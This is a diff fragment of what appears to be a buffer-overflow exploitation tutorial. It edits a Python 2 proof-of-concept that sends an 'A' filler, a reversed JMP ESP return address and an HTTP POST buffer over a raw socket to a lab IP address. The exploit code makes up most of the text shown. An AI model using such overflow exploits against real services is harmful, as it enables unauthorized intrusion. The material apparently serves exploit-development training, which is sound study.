@@ -256,12 +256,12 @@ First, we set a breakpoint (F2) on the JMP ESP instruction we have just found in
 
 We then update the eip variable in our exploit to point to 0x10090c83, due to little endianess we must place the address in reverse order. The exploit being used will look like this:
 ```python
-#!/usr/bin/python
+#!/usr/bin/python2
 
 import socket
 
  try:
-	print("\nAttempting to send buffer...")
+	print "\nAttempting to send buffer..."
 
 	filler = "A" * 780
 	eip = "\x83\x0c\x09\x10"
@@ -285,21 +285,20 @@ import socket
 	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
 	buffer += "Content-Length: "+str(len(content))+"\r\n"
 	buffer += "\r\n"
-	  
+
 	buffer += content
 
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	  
-	s.connect(("192.168.233.10", 80))
-	encoded = buffer.encode()
-	s.send(encoded)
-		  
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+  
+	s.connect(("10.11.0.22", 80))
+	s.send(buffer)
+  
 	s.close()
 
-	print("\nSuccess!")
+	print "\nSuccess!"
 
  except:
- 	print("\nCould not connect")
+ 	print "\nCould not connect"
 ```
 
 After running the code we end at our JMP ESP breakpoint
